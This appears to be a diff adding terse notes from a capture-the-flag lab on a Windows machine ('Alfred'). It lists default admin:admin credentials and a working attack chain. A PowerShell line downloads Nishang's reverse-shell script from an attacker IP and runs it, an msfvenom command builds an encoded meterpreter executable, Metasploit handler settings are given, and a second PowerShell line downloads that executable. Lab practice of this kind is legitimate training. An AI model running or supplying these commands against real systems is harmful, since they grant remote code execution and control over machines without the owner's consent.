@@ -1,0 +1,22 @@
+Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts
+
+
+
+alfred@wayneenterprises.com
+8080
+admin:admin
+
+in build script
+
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.2.66:9002/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.2.66 -Port 9000
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.2.66 LPORT=9001 -f exe -o revshell.exe
+
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.13.2.66 set 9001 listening-port run
+
+
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.2.66:9002/revshell.exe','revshell.exe')"
+
